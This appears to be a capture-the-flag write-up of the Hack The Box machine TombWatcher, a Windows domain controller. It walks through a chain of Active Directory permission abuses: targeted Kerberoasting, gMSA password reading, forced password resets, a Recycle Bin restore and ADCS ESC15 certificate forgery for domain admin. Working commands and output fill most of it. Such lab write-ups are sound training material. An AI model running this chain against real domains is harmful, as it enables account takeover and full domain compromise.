# HTB: TombWatcher — Writeup

**OS:** Windows (AD / DC)
**Difficulty:** Medium
**Techniques:** Targeted Kerberoast, AddSelf, gMSA password read, ForceChangePassword, WriteOwner, GenericAll over OU, AD Recycle Bin restore, ADCS ESC15 (CVE-2024-49019)

---

## Synopsis

TombWatcher is a Medium Windows Active Directory machine built as an assumed-breach scenario: a single low-privileged domain account (`henry`) is provided, and the entire box is a chained abuse of misconfigured Active Directory permissions. BloodHound reveals a long ACL path — `henry` can write a Service Principal Name on `alfred` (targeted Kerberoast), `alfred` can add himself to the `INFRASTRUCTURE` group, which can read the managed password of the `ansible_dev$` gMSA, which can force-reset `sam`, who owns `john`, who in turn has `GenericAll` over the `ADCS` organizational unit. `john` is a Remote Management user, giving `user.txt`. Privilege escalation hinges on the box's namesake: the ADCS OU is empty, but the AD Recycle Bin holds three tombstoned `cert_admin` accounts. Restoring the correct one and taking it over (via the inherited control from the OU) yields an account that can enroll in a vulnerable certificate template. That template is abused through ADCS **ESC15 (CVE-2024-49019)** to issue a certificate authenticating as `Administrator`, and PKINIT returns the Administrator NT hash for a full domain compromise.

## Skills Required

- Active Directory enumeration with BloodHound
- Reading and chaining ACL/object-control edges (WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner, GenericAll)
- Familiarity with Kerberos (Kerberoasting) and gMSA accounts
- Basic understanding of AD CS certificate templates and ESC attacks

## Skills Learned

- **Targeted Kerberoasting** — abusing a write over `servicePrincipalName` to make an arbitrary user roastable.
- **gMSA password retrieval** — how `msDS-ManagedPassword` works and that reading it yields an NT hash directly (no cracking).
- **The WriteOwner three-step dance** — take ownership → write yourself a DACL entry → act.
- **GenericAll over an OU** — control of a container propagates to child objects via inheritable ACEs.
- **The AD Recycle Bin** — enumerating and restoring tombstoned objects, and why the box forces you to pick the right one.
- **ADCS ESC15 (CVE-2024-49019)** — injecting an application policy into an enrollee-supplies-subject v1 template to authenticate as another user.

---

## Enumeration

### Nmap

The full TCP scan shows the unmistakable signature of a Domain Controller — DNS, Kerberos, LDAP/LDAPS, Global Catalog, kpasswd and AD Web Services — plus WinRM (5985) and a web server (80).

```
$ nmap -p- --min-rate 2000 10.129.232.167
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
[...]
```

Ports 88/389/636/3268/9389 confirm `DC01` is the Domain Controller for `tombwatcher.htb`. Port 5985 (WinRM) is the likely end-of-chain login, so the goal becomes: find an ACL path from `henry` to an account that can WinRM in, then on to Domain Admin.

### Domain user enumeration

With the assumed-breach credentials (`henry:H3nry_987TGV!`), RID cycling via `lookupsid.py` enumerates the domain principals:

```
$ lookupsid.py henry@tombwatcher.htb | awk '/SidTypeUser/ {print $2}' | cut -d '\' -f2 > users.txt
$ cat users.txt
Administrator
Guest
krbtgt
Henry
Alfred
sam
john
ansible_dev$
```

Four real users (`Henry`, `Alfred`, `sam`, `john`) plus a service account, `ansible_dev$` — worth noting early, as managed service accounts on a DC often sit in the middle of a privilege chain.

A quick credential-reuse spray (username as password, lowercased) returned nothing, so the path is about *rights*, not weak passwords.

### BloodHound

Collecting the graph as `henry` and marking him Owned exposes the full chain. The collection was performed with NetExec's LDAP BloodHound module and ingested into BloodHound CE.

```
$ nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --bloodhound --collection all --dns-server 10.129.232.167
```

The complete path, which the rest of the writeup follows:

```
henry  --WriteSPN-->          alfred       (targeted kerberoast)
alfred --AddSelf-->           INFRASTRUCTURE
INFRA  --ReadGMSAPassword-->  ansible_dev$ (NT hash)
ansible_dev$ --ForceChangePassword--> sam
sam    --WriteOwner-->        john         (WinRM -> user.txt)
john   --GenericAll-->        ADCS (OU)    (-> root via ESC15)
```

---

## Foothold

### henry → alfred: Targeted Kerberoast (WriteSPN)

`henry` holds **WriteSPN** over `alfred` — he can write the `servicePrincipalName` attribute on alfred's account.

![BloodHound graph: henry has WriteSPN over alfred](images/tombwatcher_bloodhound-henry-writespn-alfred.png)

Kerberoasting works against any account that *has* an SPN: a service ticket (TGS) for that SPN is encrypted with the account's password hash, which can be cracked offline. `alfred` has no SPN, so the attack is to **write one first** using henry's right, then request the ticket.

Set a bogus SPN on alfred with bloodyAD:

```
$ bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -H 10.129.232.167 set object alfred servicePrincipalName -v 'cifs/fake.tombwatcher.htb'
```

Now request the TGS and write it straight to a file (using `-outputfile` to avoid any shell `$`-expansion of the `$krb5tgs$` string):

```
$ impacket-GetUserSPNs -request-user alfred -dc-ip 10.129.232.167 -outputfile hashes/alfred.krb5tgs 'tombwatcher.htb/henry:H3nry_987TGV!'
```

Crack it with John (which auto-detects the `krb5tgs` format):

```
$ john hashes/alfred.krb5tgs --wordlist=rockyou.txt
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
basketball       (?)
```

`alfred:basketball`. The fake SPN was then removed to clean up.

---

## Lateral Movement

### alfred → INFRASTRUCTURE → ansible_dev$: AddSelf + gMSA read

`alfred` has **AddSelf** over the `INFRASTRUCTURE` group — he can add himself as a member — and the group holds **ReadGMSAPassword** over the `ansible_dev$` gMSA.

![BloodHound: alfred has AddSelf over the INFRASTRUCTURE group](images/tombwatcher_bloodhound-alfred-addself-infra.png)

![BloodHound: INFRASTRUCTURE group has ReadGMSAPassword over ansible_dev$](images/tombwatcher_bloodhound-infra-readgmsa-ansible.png)

A **group Managed Service Account** has its password generated and rotated automatically by AD, stored in the protected `msDS-ManagedPassword` attribute. Only principals listed in `PrincipalsAllowedToRetrieveManagedPassword` may read it — and reading it returns the NT hash directly, no cracking needed.

Add alfred to the group, then read the gMSA password:

```
$ bloodyAD -d tombwatcher.htb -u alfred -p basketball -H 10.129.232.167 add groupMember INFRASTRUCTURE alfred
$ nxc ldap tombwatcher.htb -u alfred -p basketball --gmsa
LDAP   10.129.232.167  389  DC01   Account: ansible_dev$   NTLM: 49ac0e043f08822a1d5ac558277e1cfb   PrincipalsAllowedToReadPassword: Infrastructure
```

`ansible_dev$` NT hash: `49ac0e043f08822a1d5ac558277e1cfb`.

### ansible_dev$ → sam: ForceChangePassword

`ansible_dev$` has **ForceChangePassword** over `sam`, which lets you reset sam's password without knowing the old one. Authenticating with the gMSA hash (pass-the-hash):

![BloodHound: ansible_dev$ has ForceChangePassword over sam](images/tombwatcher_bloodhound-ansible-forcechangepw-sam.png)

```
$ bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p :49ac0e043f08822a1d5ac558277e1cfb -H 10.129.232.167 set password sam 'password123'
[+] Password changed successfully!
```

### sam → john: WriteOwner (the three-step dance)

`sam` has **WriteOwner** over `john`. Owning an object doesn't by itself let you modify it — ownership grants the *implicit right to rewrite the object's DACL*. So the abuse is three steps: take ownership, grant yourself control, then use it.

![BloodHound: sam has WriteOwner over john](images/tombwatcher_bloodhound-sam-writeowner-john.png)

```
$ bloodyAD -d tombwatcher.htb -u sam -p password123 -H 10.129.232.167 set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

$ bloodyAD -d tombwatcher.htb -u sam -p password123 -H 10.129.232.167 add genericAll john sam

$ bloodyAD -d tombwatcher.htb -u sam -p password123 -H 10.129.232.167 set password john password123
[+] Password changed successfully!
```

`john` is a member of **Remote Management Users**, so WinRM is open to him. First shell and `user.txt`:

```
$ evil-winrm -i tombwatcher.htb -u john -p password123
*Evil-WinRM* PS C:\Users\john\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
```

`user.txt` retrieved.

---

## Privilege Escalation

### john → ADCS OU: GenericAll over an empty OU

`john` has **GenericAll** over the `ADCS` object — which BloodHound shows is an **organizational unit**, not a certificate template.

![BloodHound: john has GenericAll over the ADCS object](images/tombwatcher_bloodhound-john-genericall-adcs.png)

Full control over an OU is control over a *container*: you can write an inheritable ACE that propagates to every child object inside it. But listing the OU's children returns nothing — it's empty:

```
$ bloodyAD -d tombwatcher.htb -u john -p password123 -H 10.129.232.167 get children --target OU=ADCS,DC=TOMBWATCHER,DC=HTB
bloodyAD.exceptions.NoResultError: No object found in OU=ADCS,DC=TOMBWATCHER,DC=HTB [...]
```

### The TombWatcher twist: AD Recycle Bin

The box name is the hint. An empty OU that you control, on a box called *TombWatcher*, points at **deleted (tombstoned) objects** in the AD Recycle Bin. Deleted objects are hidden from normal searches — the "Show Deleted Objects" LDAP control (`1.2.840.113556.1.4.2065`) is required, and the search has to target the `Deleted Objects` container directly:

```
$ bloodyAD -d tombwatcher.htb -u john -p password123 -H 10.129.232.167 get search \
    --base 'CN=Deleted Objects,DC=tombwatcher,DC=htb' --filter '(objectClass=*)' \
    --attr distinguishedName,sAMAccountName,lastKnownParent -c 1.2.840.113556.1.4.2065

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
sAMAccountName: cert_admin

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
sAMAccountName: cert_admin

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
sAMAccountName: cert_admin
```

Three deleted `cert_admin` accounts, each with the same name but a different `objectGUID`, all last living in the `ADCS` OU. Because `sAMAccountName` must be unique, only one `cert_admin` can be live at a time, and only one is the account with the enrollment rights needed later — so it's restore → inspect → if wrong, delete and try the next.

Restore is done from john's WinRM shell using the AD module, which drops the object back into its `lastKnownParent` (the OU john controls):

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-Command Restore-ADObject
Cmdlet   Restore-ADObject   1.0.1.0   ActiveDirectory

*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

With `cert_admin` live in the OU, john's `GenericAll` (inherited down to the restored child) is used to reset its password to a known value, giving a usable account.

### ADCS ESC15 (CVE-2024-49019)

Enumerating AD CS as `cert_admin` with Certipy flags two issues; the actionable one is **ESC15**:

```
$ certipy find -u 'cert_admin@tombwatcher.htb' -p 'password123' -dc-ip 10.129.232.167 -vulnerable -stdout
[!] Vulnerabilities
    ESC15 : Enrollee supplies subject and schema version is 1.
    ESC17 : Enrollee supplies subject and template allows server authentication.
```

**ESC15 (CVE-2024-49019)** affects schema **version 1** templates where the enrollee supplies the subject. Because such a template doesn't pin its application policies, you can request a certificate against it and **inject a `Client Authentication` application policy** (which the "WebServer" template was never meant to grant) while setting the subject identity to `Administrator`. The CA signs it, producing a certificate that authenticates to AD as the Domain Admin.

Request the certificate as Administrator (clock synced to the DC with `faketime` to avoid Kerberos skew):

```
$ faketime -f '+4h' certipy req -u cert_admin@tombwatcher.htb -p password123 \
    -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb \
    -ca tombwatcher-CA-1 -template WebServer \
    -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticate with the resulting PFX — PKINIT returns the Administrator NT hash:

```
$ faketime -f '+4h' certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

Pass-the-hash into a WinRM shell as Administrator and read the flag:

```
$ evil-winrm -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

`root.txt` retrieved — full domain compromise.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | DC port profiling; RID cycling with `lookupsid.py`; BloodHound graph as `henry` |
| Foothold | Targeted Kerberoast — WriteSPN on `alfred`, crack TGS → `alfred:basketball` |
| Lateral Movement | AddSelf to `INFRASTRUCTURE`; read `ansible_dev$` gMSA password; ForceChangePassword on `sam`; WriteOwner → GenericAll → reset `john`; WinRM for `user.txt` |
| PrivEsc | GenericAll over `ADCS` OU; restore tombstoned `cert_admin` from AD Recycle Bin; ADCS ESC15 (CVE-2024-49019) to forge an Administrator cert; PKINIT → Administrator NT hash |

---

## Lessons / Takeaways

- **Assumed-breach Windows boxes are BloodHound boxes.** The credentials are given because the whole box is a chain of object-control edges — collect the graph, mark the start node Owned, and read the path before touching services.
- **Each ACL edge has its own abuse.** WriteSPN → Kerberoast; AddSelf → join a group to inherit its rights; ReadGMSAPassword → NT hash with no cracking; ForceChangePassword → reset; WriteOwner → the own/grant/act three-step; GenericAll over an OU → inheritable ACE onto children. Knowing the *right-to-action* mapping is the real skill here.
- **An empty container you control is a clue, not a dead end.** Combined with the box name, it pointed straight at the AD Recycle Bin. The "Show Deleted Objects" control and the `CN=Deleted Objects` base are easy to miss — a plain `(isDeleted=TRUE)` search returns nothing without them.
- **The multiple `cert_admin` decoys** are a deliberate trap: only one GUID is the privileged account, and the name-uniqueness constraint means you can only test one at a time.
- **ESC15 is the modern "enrollee supplies subject" ADCS escalation** — on a v1 template you inject the application policy you need rather than relying on the template already granting it.
- **Operational gotchas that cost time:** double-quoting a `$krb5tgs$` hash lets bash expand it into nothing (`-outputfile` sidesteps it); backslashes in `DOMAIN\user` must be quoted; a dangling `rockyou.txt` symlink; and Kerberos clock skew on the Certipy `auth` step (fixed with `faketime`/time sync).
